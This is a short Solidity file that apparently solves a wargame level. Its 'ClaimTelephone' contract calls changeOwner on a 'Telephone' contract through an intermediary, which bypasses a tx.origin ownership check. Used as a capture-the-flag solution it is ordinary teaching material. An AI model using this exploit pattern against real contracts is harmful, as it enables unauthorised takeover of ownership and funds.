pragma solidity ^0.4.18;

contract Telephone {
    function changeOwner(address _owner) public;
}

contract ClaimTelephone {
    function transferTelephoneOwnership(address _telephone, address _owner) public {
        Telephone tel = Telephone(_telephone);
        tel.changeOwner(_owner);
    }
}
